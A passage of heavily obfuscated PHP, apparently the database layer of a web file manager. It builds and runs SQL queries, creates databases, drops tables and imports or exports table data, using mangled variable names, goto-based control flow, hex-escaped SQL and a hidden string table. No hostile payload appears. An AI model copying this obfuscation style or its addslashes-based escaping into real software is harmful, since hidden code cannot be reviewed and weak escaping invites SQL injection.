= array(); foreach ($Déâﬁâπ¬Û as $CÌ⁄ÈóÊıª => $cüÒÑÑæ©”) { if (is_numeric($CÌ⁄ÈóÊıª)) { $aàªÂﬂÔßã[] = $this->parseKey($cüÒÑÑæ©”); } else { $cüÒÑÑæ©” = in_array(strtoupper(trim($cüÒÑÑæ©”)), array($C‚—Œ¥…¢ı[947], $C‚—Œ¥…¢ı[948])) ? $C‚—Œ¥…¢ı[50] . $cüÒÑÑæ©” : $C‚—Œ¥…¢ı[33]; if (preg_match($C‚—Œ¥…¢ı[949], $CÌ⁄ÈóÊıª)) { $aàªÂﬂÔßã[] = $this->parseKey($CÌ⁄ÈóÊıª) . $cüÒÑÑæ©”; } else { think_exception($C‚—Œ¥…¢ı[950] . $CÌ⁄ÈóÊıª); } } } $Déâﬁâπ¬Û = implode($C‚—Œ¥…¢ı[47], $aàªÂﬂÔßã); } return !empty($Déâﬁâπ¬Û) ? $C‚—Œ¥…¢ı[951] . $Déâﬁâπ¬Û : $C‚—Œ¥…¢ı[33]; } protected function parseGroup($CêâÜßèÉ») { $C∂¬éÈêô‚ =& $_SERVER[—Ω]; return !empty($CêâÜßèÉ») ? $C∂¬éÈêô‚[952] . $CêâÜßèÉ» : $C∂¬éÈêô‚[33]; } protected function parseHaving($féÆ∞Í÷§) { $A‚ﬁ⁄à±™§ =& $_SERVER[—Ω]; return !empty($féÆ∞Í÷§) ? $A‚ﬁ⁄à±™§[953] . $féÆ∞Í÷§ : $A‚ﬁ⁄à±™§[33]; } protected function parseComment($FÛ«Ë°Ó÷™) { $dıÉÍ¿ä©ç =& $_SERVER[—Ω]; return !empty($FÛ«Ë°Ó÷™) ? $dıÉÍ¿ä©ç[954] . $FÛ«Ë°Ó÷™ . $dıÉÍ¿ä©ç[955] : $dıÉÍ¿ä©ç[33]; } protected function parseDistinct($füí¶â¢ê¿) { $D—ﬁôÖ‹ê’ =& $_SERVER[—Ω]; return !empty($füí¶â¢ê¿) ? $D—ﬁôÖ‹ê’[956] : $D—ﬁôÖ‹ê’[33]; } protected function parseUnion($AÏ…ŒÃñ™Â) { $BÌÏïáÊÕ⁄ =& $_SERVER[—Ω]; if (empty($AÏ…ŒÃñ™Â)) { return $BÌÏïáÊÕ⁄[33]; } if (isset($AÏ…ŒÃñ™Â[$BÌÏïáÊÕ⁄[333]])) { $C§âÎáÀ∏√ = $BÌÏïáÊÕ⁄[957]; unset($AÏ…ŒÃñ™Â[$BÌÏïáÊÕ⁄[333]]); } else { $C§âÎáÀ∏√ = $BÌÏïáÊÕ⁄[958]; } foreach ($AÏ…ŒÃñ™Â as $E∆«îºÆ¿) { $fûÇÈﬂÕ¬å[] = $C§âÎáÀ∏√ . (is_array($E∆«îºÆ¿) ? $this->buildSelectSql($E∆«îºÆ¿) : $E∆«îºÆ¿); } return implode($BÌÏïáÊÕ⁄[50], $fûÇÈﬂÕ¬å); } public function insert($B©Í∑ÊÛœ÷, $FÛè«ﬂıÉ∆ = array(), $DﬂüÑº¿«≠ = false) { goto eçÇıÏ⁄Ãµ; eçÇıÏ⁄Ãµ: $eìÁù„Ö©´ =& $_SERVER[—Ω]; $Aüìùïƒ¥¶ = $CÒµîıßá≠ = array(); $this->model = $FÛè«ﬂıÉ∆[$eìÁù„Ö©´[266]]; goto cπÀ≤Ì’Ó∑; bù≈∞“°Öæ: $aæ…ê∏ƒ§ .= $this->parseComment(!empty($FÛè«ﬂıÉ∆[$eìÁù„Ö©´[338]]) ? $FÛè«ﬂıÉ∆[$eìÁù„Ö©´[338]] : $eìÁù„Ö©´[33]); return $this->execute($aæ…ê∏ƒ§, $this->parseBind(!empty($FÛè«ﬂıÉ∆[$eìÁù„Ö©´[270]]) ? $FÛè«ﬂıÉ∆[$eìÁù„Ö©´[270]] : array())); goto BÕ§å¢†éç; cπÀ≤Ì’Ó∑: foreach ($B©Í∑ÊÛœ÷ as $A‡∆ØÑ©Ãì => $Aàû∂≥‘Ÿ’) { if (is_array($Aàû∂≥‘Ÿ’) && $eìÁù„Ö©´[282] == $Aàû∂≥‘Ÿ’[0]) { $CÒµîıßá≠[] = $this->parseKey($A‡∆ØÑ©Ãì); $Aüìùïƒ¥¶[] = $Aàû∂≥‘Ÿ’[1]; } elseif (is_scalar($Aàû∂≥‘Ÿ’) || is_null($Aàû∂≥‘Ÿ’)) { $CÒµîıßá≠[] = $this->parseKey($A‡∆ØÑ©Ãì); $Aüìùïƒ¥¶[] = $this->parseValue($Aàû∂≥‘Ÿ’); } } $aæ…ê∏ƒ§ = ($DﬂüÑº¿«≠ ? $eìÁù„Ö©´[824] : $eìÁù„Ö©´[825]) . $eìÁù„Ö©´[826] . $this->parseTable($FÛè«ﬂıÉ∆[$eìÁù„Ö©´[264]]) . $eìÁù„Ö©´[820] . implode($eìÁù„Ö©´[47], $CÒµîıßá≠) . $eìÁù„Ö©´[821] . implode($eìÁù„Ö©´[47], $Aüìùïƒ¥¶) . $eìÁù„Ö©´[822]; $aæ…ê∏ƒ§ .= $this->parseLock(isset($FÛè«ﬂıÉ∆[$eìÁù„Ö©´[780]]) ? $FÛè«ﬂıÉ∆[$eìÁù„Ö©´[780]] : !1); goto bù≈∞“°Öæ; BÕ§å¢†éç: } public function selectInsert($e≈«Ê÷¯Ö, $cîÁé€ıõå, $A÷ì¨∂Ó√’ = array()) { goto Bòﬁï€‚ûï; aæﬂóæã—Õ: return $this->execute($eßß¢£∫ÑΩ, $this->parseBind(!empty($A÷ì¨∂Ó√’[$FÜ¨Ω·ë˘ø[270]]) ? $A÷ì¨∂Ó√’[$FÜ¨Ω·ë˘ø[270]] : array())); goto bü’π‡ƒ•⁄; Bòﬁï€‚ûï: $FÜ¨Ω·ë˘ø =& $_SERVER[—Ω]; $this->model = $A÷ì¨∂Ó√’[$FÜ¨Ω·ë˘ø[266]]; if (is_string($e≈«Ê÷¯Ö)) { $e≈«Ê÷¯Ö = explode($FÜ¨Ω·ë˘ø[47], $e≈«Ê÷¯Ö); } goto D≈áì‘È¶†; D≈áì‘È¶†: array_walk($e≈«Ê÷¯Ö, array($this, $FÜ¨Ω·ë˘ø[823])); $eßß¢£∫ÑΩ = $FÜ¨Ω·ë˘ø[959] . $this->parseTable($cîÁé€ıõå) . $FÜ¨Ω·ë˘ø[820] . implode($FÜ¨Ω·ë˘ø[47], $e≈«Ê÷¯Ö) . $FÜ¨Ω·ë˘ø[938]; $eßß¢£∫ÑΩ .= $this->buildSelectSql($A÷ì¨∂Ó√’); goto aæﬂóæã—Õ; bü’π‡ƒ•⁄: } public function update($Fãı€®”‘ì, $bæ˘ÇçÉøı) { $EíŸº‹≈ıà =& $_SERVER[—Ω]; $this->model = $bæ˘ÇçÉøı[$EíŸº‹≈ıà[266]]; $c´àÎÎ›©” = $EíŸº‹≈ıà[960] . $this->parseTable($bæ˘ÇçÉøı[$EíŸº‹≈ıà[264]]) . $this->parseSet($Fãı€®”‘ì) . $this->parseWhere(!empty($bæ˘ÇçÉøı[$EíŸº‹≈ıà[260]]) ? $bæ˘ÇçÉøı[$EíŸº‹≈ıà[260]] : $EíŸº‹≈ıà[33]) . $this->parseOrder(!empty($bæ˘ÇçÉøı[$EíŸº‹≈ıà[347]]) ? $bæ˘ÇçÉøı[$EíŸº‹≈ıà[347]] : $EíŸº‹≈ıà[33]) . $this->parseLimit(!empty($bæ˘ÇçÉøı[$EíŸº‹≈ıà[277]]) ? $bæ˘ÇçÉøı[$EíŸº‹≈ıà[277]] : $EíŸº‹≈ıà[33]) . $this->parseLock(isset($bæ˘ÇçÉøı[$EíŸº‹≈ıà[780]]) ? $bæ˘ÇçÉøı[$EíŸº‹≈ıà[780]] : !1) . $this->parseComment(!empty($bæ˘ÇçÉøı[$EíŸº‹≈ıà[338]]) ? $bæ˘ÇçÉøı[$EíŸº‹≈ıà[338]] : $EíŸº‹≈ıà[33]); return $this->execute($c´àÎÎ›©”, $this->parseBind(!empty($bæ˘ÇçÉøı[$EíŸº‹≈ıà[270]]) ? $bæ˘ÇçÉøı[$EíŸº‹≈ıà[270]] : array())); } public function delete($DõÛ—æ⁄ëÇ = array()) { $CÕ◊±ø∏ÀÏ =& $_SERVER[—Ω]; $this->model = $DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[266]]; $a¢êíÙŒÀ¯ = $CÕ◊±ø∏ÀÏ[961] . $this->parseTable($DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[264]]) . $this->parseWhere(!empty($DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[260]]) ? $DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[260]] : $CÕ◊±ø∏ÀÏ[33]) . $this->parseOrder(!empty($DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[347]]) ? $DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[347]] : $CÕ◊±ø∏ÀÏ[33]) . $this->parseLimit(!empty($DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[277]]) ? $DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[277]] : $CÕ◊±ø∏ÀÏ[33]) . $this->parseLock(isset($DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[780]]) ? $DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[780]] : !1) . $this->parseComment(!empty($DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[338]]) ? $DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[338]] : $CÕ◊±ø∏ÀÏ[33]); return $this->execute($a¢êíÙŒÀ¯, $this->parseBind(!empty($DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[270]]) ? $DõÛ—æ⁄ëÇ[$CÕ◊±ø∏ÀÏ[270]] : array())); } public function select($CìçÌÿÜı• = array()) { goto aúâ±€¨ëƒ; CíˆΩÃ‹◊ : $FÒ·…€≤∂ﬂ = isset($CìçÌÿÜı•[$E©ÂÜ†ıö¢[334]]) ? $CìçÌÿÜı•[$E©ÂÜ†ıö¢[334]] : !1; if ($FÒ·…€≤∂ﬂ) { $D≠çáΩÍ†á = is_string($FÒ·…€≤∂ﬂ[$E©ÂÜ†ıö¢[89]]) ? $FÒ·…€≤∂ﬂ[$E©ÂÜ†ıö¢[89]] : $E©ÂÜ†ıö¢[962] . md5($DËıò¿à≠–); $D·¨≈á±›÷ = think_cache($D≠çáΩÍ†á, $E©ÂÜ†ıö¢[33], $FÒ·…€≤∂ﬂ); if (!1 !== $D·¨≈á±›÷) { return $D·¨≈á±›÷; } } $DäØú∞ÆƒÛ = $this->query($DËıò¿à≠–, $this->parseBind(!empty($CìçÌÿÜı•[$E©ÂÜ†ıö¢[270]]) ? $CìçÌÿÜı•[$E©ÂÜ†ıö¢[270]] : array())); goto FñÑ‰æïõÛ; aúâ±€¨ëƒ: $E©ÂÜ†ıö¢ =& $_SERVER[—Ω]; $this->model = $CìçÌÿÜı•[$E©ÂÜ†ıö¢[266]]; $DËıò¿à≠– = $this->buildSelectSql($CìçÌÿÜı•); goto CíˆΩÃ‹◊ ; FñÑ‰æïõÛ: if ($FÒ·…€≤∂ﬂ && !1 !== $DäØú∞ÆƒÛ) { think_cache($D≠çáΩÍ†á, $DäØú∞ÆƒÛ, $FÒ·…€≤∂ﬂ); } return $DäØú∞ÆƒÛ; goto C‰ÛÌü∫⁄∫; C‰ÛÌü∫⁄∫: } public function buildSelectSql($eá“É»Ωøû = array()) { goto bÑëÔﬁΩû¡; bÑëÔﬁΩû¡: $bµËÀåÂÔˆ =& $_SERVER[—Ω]; if (isset($eá“É»Ωøû[$bµËÀåÂÔˆ[337]])) { if (strpos($eá“É»Ωøû[$bµËÀåÂÔˆ[337]], $bµËÀåÂÔˆ[47])) { list($fã∑†Æﬁ¥™, $Bª≈™åªáà) = explode($bµËÀåÂÔˆ[47], $eá“É»Ωøû[$bµËÀåÂÔˆ[337]]); } else { $fã∑†Æﬁ¥™ = $eá“É»Ωøû[$bµËÀåÂÔˆ[337]]; } $fã∑†Æﬁ¥™ = $fã∑†Æﬁ¥™ ? $fã∑†Æﬁ¥™ : 1; $Bª≈™åªáà = isset($Bª≈™åªáà) ? $Bª≈™åªáà : (is_numeric($eá“É»Ωøû[$bµËÀåÂÔˆ[277]]) ? $eá“É»Ωøû[$bµËÀåÂÔˆ[277]] : 20); $d¡Úﬂ•ì¥Â = $Bª≈™åªáà * ((int) $fã∑†Æﬁ¥™ - 1); $eá“É»Ωøû[$bµËÀåÂÔˆ[277]] = $d¡Úﬂ•ì¥Â . $bµËÀåÂÔˆ[47] . $Bª≈™åªáà; } if (think_config($bµËÀåÂÔˆ[963])) { $bÇˆ∆µîÔΩ = $bµËÀåÂÔˆ[964] . md5(serialize($eá“É»Ωøû)); $côÑŸ”π”© = think_cache($bÇˆ∆µîÔΩ); if ($côÑŸ”π”©) { return $côÑŸ”π”©; } } goto b˘äΩÉ´˜∫; b˘äΩÉ´˜∫: $CÉâ· ìÊê = $this->parseSql($this->selectSql, $eá“É»Ωøû); $CÉâ· ìÊê .= $this->parseLock(isset($eá“É»Ωøû[$bµËÀåÂÔˆ[780]]) ? $eá“É»Ωøû[$bµËÀåÂÔˆ[780]] : !1); if (isset($bÇˆ∆µîÔΩ)) { think_cache($bÇˆ∆µîÔΩ, $CÉâ· ìÊê); } goto eø≈Ø§óÀÎ; eø≈Ø§óÀÎ: return $CÉâ· ìÊê; goto d€ﬂØï±”•; d€ﬂØï±”•: } public function parseSql($CﬂÈ°Çµ∫¢, $aﬁ’‡·∑ÁÏ = array()) { $B…Æé©òÉÁ =& $_SERVER[—Ω]; $CﬂÈ°Çµ∫¢ = str_replace(array($B…Æé©òÉÁ[965], $B…Æé©òÉÁ[966], $B…Æé©òÉÁ[967], $B…Æé©òÉÁ[968], $B…Æé©òÉÁ[969], $B…Æé©òÉÁ[970], $B…Æé©òÉÁ[971], $B…Æé©òÉÁ[972], $B…Æé©òÉÁ[973], $B…Æé©òÉÁ[974], $B…Æé©òÉÁ[975]), array($this->parseTable("{$aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[264]]}"), $this->parseDistinct(isset($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[976]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[976]] : !1), $this->parseField(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[258]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[258]] : $B…Æé©òÉÁ[173]), $this->parseJoin(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[267]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[267]] : $B…Æé©òÉÁ[33]), $this->parseWhere(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[260]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[260]] : $B…Æé©òÉÁ[33]), $this->parseGroup(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[977]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[977]] : $B…Æé©òÉÁ[33]), $this->parseHaving(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[978]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[978]] : $B…Æé©òÉÁ[33]), $this->parseOrder(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[347]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[347]] : $B…Æé©òÉÁ[33]), $this->parseLimit(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[277]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[277]] : $B…Æé©òÉÁ[33]), $this->parseUnion(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[332]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[332]] : $B…Æé©òÉÁ[33]), $this->parseComment(!empty($aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[338]]) ? $aﬁ’‡·∑ÁÏ[$B…Æé©òÉÁ[338]] : $B…Æé©òÉÁ[33])), $CﬂÈ°Çµ∫¢); return $CﬂÈ°Çµ∫¢; } public function getLastSql($Dﬂ›‚èéßÀ = '') { return $Dﬂ›‚èéßÀ ? $this->modelSql[$Dﬂ›‚èéßÀ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($B˜ˆ£ø£„) { return addslashes($B˜ˆ£ø£„); } public function setModel($dØø˜ÃÆ‘É) { $this->model = $dØø˜ÃÆ‘É; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($eπ•èéÁçÖ, $B∏‚ïÇó…÷ = '') { $this->database = $eπ•èéÁçÖ; $this->type = $B∏‚ïÇó…÷; } public function model($Dú‚ı÷àÌ≤ = '') { return new ModelBase($Dú‚ı÷àÌ≤, $_SERVER[—Ω][33], $this->database); } public function db($AŸ∫ß∏ó›ü = false) { goto DÇãï˜–Ì†; A¨±∂”ÓÒÓ: if (!$AÏ¥¥ΩﬁèÙ) { $FªÑ·ì∂®◊->execute("\143\162\145\141\164\145\40\144\x61\x74\141\142\141\163\145\40\x60{$D–àÛóƒ‚ã}\x60"); } $eı©≤œ—€[$AëÆÛ˘é‰è[231]] = $D–àÛóƒ‚ã; if ($eı©≤œ—€[$AëÆÛ˘é‰è[894]] == $AëÆÛ˘é‰è[734]) { $eı©≤œ—€[$AëÆÛ˘é‰è[893]] .= $AëÆÛ˘é‰è[979] . $D–àÛóƒ‚ã; } goto eÑÎÑó∫Ó®; C‹Ü∂¶¶»—: $D–àÛóƒ‚ã = $eı©≤œ—€[$AëÆÛ˘é‰è[231]]; $eı©≤œ—€[$AëÆÛ˘é‰è[231]] = $AëÆÛ˘é‰è[33]; if ($eı©≤œ—€[$AëÆÛ˘é‰è[894]] == $AëÆÛ˘é‰è[734]) { $c··∞ù™–‚ = $eı©≤œ—€[$AëÆÛ˘é‰è[893]]; $eı©≤œ—€[$AëÆÛ˘é‰è[893]] = substr($c··∞ù™–‚, 0, strrpos($c··∞ù™–‚, $AëÆÛ˘é‰è[979])); } goto A»â†µÂÇõ; eÑÎÑó∫Ó®: $this->database = $eı©≤œ—€; $FªÑ·ì∂®◊->execute("\165\163\x65\x20\140{$D–àÛóƒ‚ã}\x60"); return $FªÑ·ì∂®◊; goto B≠⁄Ì¢ü˜∑; DÇãï˜–Ì†: $AëÆÛ˘é‰è =& $_SERVER[—Ω]; $eı©≤œ—€ = $this->database; if ($this->type == $AëÆÛ˘é‰è[9] || !$AŸ∫ß∏ó›ü) { return $this->model()->db(); } goto C‹Ü∂¶¶»—; A»â†µÂÇõ: $this->database = $eı©≤œ—€; $FªÑ·ì∂®◊ = $this->model()->db(); $AÏ¥¥ΩﬁèÙ = $FªÑ·ì∂®◊->execute("\x73\150\x6f\167\x20\144\141\x74\x61\142\141\x73\145\163\40\x6c\151\x6b\x65\40\x27{$D–àÛóƒ‚ã}\x27"); goto A¨±∂”ÓÒÓ; B≠⁄Ì¢ü˜∑: } public function createTable($aã´‚ÕÖ’ï, $Báï»” Çˆ = null) { $AˆﬁäÈãƒ° =& $_SERVER[—Ω]; if (!IO::exist($aã´‚ÕÖ’ï)) { show_json(LNG($AˆﬁäÈãƒ°[980]), !1); } $F∏€‚ﬂÛ∆• = sqlSplit(IO::getContent($aã´‚ÕÖ’ï)); foreach ($F∏€‚ﬂÛ∆• as $E€êœ§ù≤Ñ) { if ($Báï»” Çˆ) { $e∏Ÿò‘ÆÑ’ = stripos($E€êœ§ù≤Ñ, $AˆﬁäÈãƒ°[981]) === 0; if ($e∏Ÿò‘ÆÑ’) { $Báï»” Çˆ->task[$AˆﬁäÈãƒ°[982]] += 1; } } $this->model()->db()->execute($E€êœ§ù≤Ñ); if ($Báï»” Çˆ && $e∏Ÿò‘ÆÑ’) { $eê€≠◊åﬁ∏ = $AˆﬁäÈãƒ°[983]; preg_match($eê€≠◊åﬁ∏, $E€êœ§ù≤Ñ, $d¨ÜÀûúÑÚ); $Báï»” Çˆ->task[$AˆﬁäÈãƒ°[984]] = trim($a»æˆ‚ã±·[0], $AˆﬁäÈãƒ°[829]); $Báï»” Çˆ->update(1); } } $this->taskToCache($Báï»” Çˆ); } public function insertTable($açë‘Ø™®ı, $C’ÿ®Æµ „ = null) { $F£¯€•¶ÈÀ =& $_SERVER[—Ω]; foreach ($açë‘Ø™®ı as $fïá“·Òµ ) { $C˘∑†Êª©î = basename($fïá“·Òµ ); $C˘∑†Êª©î = substr($C˘∑†Êª©î, 0, strrpos($C˘∑†Êª©î, $F£¯€•¶ÈÀ[93])); if ($C’ÿ®Æµ „) { $C’ÿ®Æµ „->task[$F£¯€•¶ÈÀ[984]] = $C˘∑†Êª©î; } if (get_filesize($fïá“·Òµ ) == 0) { continue; } $cà”ÿëëÿ∂ = $this->sqlToDb($fïá“·Òµ , $C’ÿ®Æµ „); if (!$cà”ÿëëÿ∂) { show_json(LNG($F£¯€•¶ÈÀ[985]) . "\133{$C˘∑†Êª©î}\x5d", !1); } } $this->taskToCache($C’ÿ®Æµ „); } public function sqlFromDb($D±é‰‹ÏÓŸ, $FÀ≥æµ°È·, $Eâ†ÏÙúœé = null, $bÈ¥ñΩ¯∏ü = null) { goto A†çêÍºöö; eË›ê÷≠ú≈: fclose($CŒÃèÂø∏); return $b∂È©ÑÖŸ…; goto dÀ ˆïïê‡; e√ÕîüéÊ¿: $aÍïÃ™√∆∞ = $Bœ≥Ùõ∂Ó≤->getPk(); $bÜæäÉÑ¯¿ = $Bœ≥Ùõ∂Ó≤->getDbFields(); do { $eâç¯—ÚÓü = $Bœ≥Ùõ∂Ó≤->field($bÜæäÉÑ¯¿)->order($aÍïÃ™√∆∞ . $_SERVER[—Ω][987])->selectPage($bôâ≈öÏ¶Õ, $C˜‹˘„ÚÚ¡); $DÛ®≥≥â∏™ = !empty($eâç¯—ÚÓü[$_SERVER[—Ω][351]]) ? $eâç¯—ÚÓü[$_SERVER[—Ω][351]] : array(); if (!($eì≥àÑØ™ø = count($DÛ®≥≥â∏™))) { break; } if ($Eâ†ÏÙúœé) { $Eâ†ÏÙúœé->task[$_SERVER[—Ω][982]] += $eì≥àÑØ™ø; } $C °ä¢ÜÆ… = array(); foreach ($DÛ®≥≥â∏™ as $C•≤ßàâπ™) { if ($bÈ¥ñΩ¯∏ü) { $C•≤ßàâπ™[$_SERVER[—Ω][75]] = "\173\151\x6f\x3a{$bÈ¥ñΩ¯∏ü}\175" . substr($C•≤ßàâπ™[$_SERVER[—Ω][75]], strlen("\x7b\151\x6f\72{$C•≤ßàâπ™[$_SERVER[—Ω][753]]}\175")); $C•≤ßàâπ™[$_SERVER[—Ω][753]] = $bÈ¥ñΩ¯∏ü; } $C °ä¢ÜÆ…[] = $_SERVER[—Ω][988] . $this->sqlEncode($C•≤ßàâπ™) . $_SERVER[—Ω][989]; } $BûÍ≈äèâñ = "\111\116\x53\x45\x52\124\x20\x49\116\124\x4f\40\x60{$D±é‰‹ÏÓŸ}\140\x20\50\x60" . implode($_SERVER[—Ω][990], $bÜæäÉÑ¯¿) . $_SERVER[—Ω][991]; fwrite($CŒÃèÂø∏, $BûÍ≈äèâñ . implode($_SERVER[—Ω][992], $C °ä¢ÜÆ…) . $_SERVER[—Ω][67] . PHP_EOL); $C˜‹˘„ÚÚ¡++; $b∂È©ÑÖŸ… += $eì≥àÑØ™ø; if ($Eâ†ÏÙúœé) { $Eâ†ÏÙúœé->update($eì≥àÑØ™ø); } } while ($eì≥àÑØ™ø == $bôâ≈öÏ¶Õ); goto eË›ê÷≠ú≈; D„±™ÜØöä: $C˜‹˘„ÚÚ¡ = 1; $bôâ≈öÏ¶Õ = 500; $CŒÃèÂø∏ = fopen($FÀ≥æµ°È·, $_SERVER[—Ω][986]); goto e√ÕîüéÊ¿; A†çêÍºöö: if ($Eâ†ÏÙúœé) { $Eâ†ÏÙúœé->task[$_SERVER[—Ω][984]] = $D±é‰‹ÏÓŸ; } $Bœ≥Ùõ∂Ó≤ = $this->model($D±é‰‹ÏÓŸ); $b∂È©ÑÖŸ… = 0; goto D„±™ÜØöä; dÀ ˆïïê‡: } public function sqlToDb($d≤ˆÙ˘€Õ„, $Eÿ¿¬ùä◊‚ = null) { goto eèæÜ™·œ∫; eÉ¶ﬂê´Ü‚: if (!$A˘ÿ¡Ñìüº) { return !1; } $CÏπñ„Ω°• = 0; $aáêÆÑß÷¥ = $C·©ıÒ†Òµ[33]; goto A¶∏ﬂÔøòà; eèæÜ™·œ∫: $C·©ıÒ†Òµ =& $_SERVER[—Ω]; $Cæ°ã·ª‰Ç = $this->model()->db(); $A˘ÿ¡Ñìüº = @fopen($d≤ˆÙ˘€Õ„, $C·©ıÒ†Òµ[993]); goto eÉ¶ﬂê´Ü‚; cã¯≈⁄åÂ¢: if ($aáêÆÑß÷¥) { $aáêÆÑß÷¥ = rtrim(trim($aáêÆÑß÷¥), $C·©ıÒ†Òµ[67]); if (!$Cæ°ã·ª‰Ç->execute($aáêÆÑß÷¥)) { return !1; } if ($Eÿ¿¬ùä◊‚) { $Eÿ¿¬ùä◊‚->update($CÏπñ„Ω°• - 1); } } return !0; goto dÛêÍ´Ë; A¶∏ﬂÔøòà: $eÿﬂ®…Ò„à = 500 + 1; while (!feof($A˘ÿ¡Ñìüº)) { if ($Eÿ¿¬ùä◊‚ && $CÏπñ„Ω°• != 0) { $Eÿ¿¬ùä◊‚->task[$C·©ıÒ†Òµ[982]] += 1; } $CÏπñ„Ω°•++; $aíçÍÇëöπ = trim(fgets($A˘ÿ¡Ñìüº)); $aáêÆÑß÷¥ .= $C·©ıÒ†Òµ[50] . $this->sqlDecode($aíçÍÇëöπ, $this->type); if ($CÏπñ„Ω°• == $eÿﬂ®…Ò„à) { $aáêÆÑß÷¥ = rtrim(trim($aáêÆÑß÷¥), $C·©ıÒ†Òµ[67]); if (!$Cæ°ã·ª‰Ç->execute($aáêÆÑß÷¥)) { return !1; } if ($Eÿ¿¬ùä◊‚) { $Eÿ¿¬ùä◊‚->update($CÏπñ„Ω°• - 1); } $aáêÆÑß÷¥ = $C·©ıÒ†Òµ[33]; $CÏπñ„Ω°• = 0; } } fclose($A˘ÿ¡Ñìüº); goto cã¯≈⁄åÂ¢; dÛêÍ´Ë: } public function dropTable($CŸµ⁄ü≤ÃÌ = null) { $aì±ﬂ◊¶Ö≈ = $this->model()->db(); $CÏ¯Ã∆ãÒë = $CŸµ⁄ü≤ÃÌ ? array($CŸµ⁄ü≤ÃÌ) : $aì±ﬂ◊¶Ö≈->getTables(); if (!$CÏ¯Ã∆ãÒë) { return; } foreach ($CÏ¯Ã∆ãÒë as $CŸµ⁄ü≤ÃÌ) { $aì±ﬂ◊¶Ö≈->execute("\144\162\157\160\x20\x74\141\142\x6c\x65\40\x69\x66\40\x65\x78\x69\163\x74\x73\x20\x60{$CŸµ⁄ü≤ÃÌ}\x60"); } } private function taskToCache($C¿£Ωæ ÃÂ = null) { $Eá¡ß¶ƒêŸ =& $_SERVER[—Ω]; if (!$C¿£Ωæ ÃÂ) { return; } $d–Á”πà¶Ñ = array($Eá¡ß¶ƒêŸ[984] => $C¿£Ωæ ÃÂ->task[$Eá¡ß¶ƒêŸ[984]], $Eá¡ß¶ƒêŸ[982] => $C¿£Ωæ ÃÂ->task[$Eá¡ß¶ƒêŸ[982]], $Eá¡ß¶ƒêŸ[994] => $C¿£Ωæ ÃÂ->task[$Eá¡ß¶ƒêŸ[994]]); if ($d–Á”πà¶Ñ[$Eá¡ß¶ƒêŸ[982]] == $d–Á”πà¶Ñ[$Eá¡ß¶ƒêŸ[994]]) { $d–Á”πà¶Ñ[$Eá¡ß¶ƒêŸ[706]] = 1; } Cache::set($Eá¡ß¶ƒêŸ[995] . $C¿£Ωæ ÃÂ->task[$Eá¡ß¶ƒêŸ[364]], $d–Á”πà¶Ñ); $C¿£Ωæ ÃÂ->end(); } private function sqlEncode($a‚Ñ¨Òõ‚á) { $bÙ—åÁáø† =& $_SERVER[—Ω]; $eƒ§ß∆“‘Õ = array(); foreach ($a‚Ñ¨Òõ‚á as $Eí≤É∆¨ƒ∞) { if (is_array($Eí≤É∆¨ƒ∞)) { $Eí≤É∆¨ƒ∞ = json_encode_force($Eí≤É∆¨ƒ∞); } $Eí≤É∆¨ƒ∞ = addslashes($Eí≤É∆¨ƒ∞); $Eí≤É∆¨ƒ∞ = str_replace(array($bÙ—åÁáø†[996], $bÙ—åÁáø†[214]), array($bÙ—åÁáø†[997], $bÙ—åÁáø†[998]), $Eí≤É∆¨ƒ∞); $eƒ§ß∆“‘Õ[] = str_replace($bÙ—åÁáø†[55], $bÙ—åÁáø†[999], $Eí≤É∆¨ƒ∞); } return $bÙ—åÁáø†[55] . implode($bÙ—åÁáø†[1000], $eƒ§ß∆“‘Õ) . $bÙ—åÁáø†[55]; } private function sqlDecode($döŒ·üóÌÔ, $D„ﬁı“™£„) { $D¶éç‘§¨ı =& $_SERVER[—Ω]; $döŒ·üóÌÔ = str_replace(array($D¶éç‘§¨ı[997], $D¶éç‘§¨ı[998]), array($D¶éç‘§¨ı[996], $D¶éç‘§¨ı[214]), $döŒ·üóÌÔ); if ($D„ﬁı“™£„ == $D¶éç‘§¨ı[9]) { $döŒ·üóÌÔ = stripslashes($döŒ·üóÌÔ); } return $döŒ·üóÌÔ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($aç‚á§πΩµ, $b‹û´°ü◊û) { 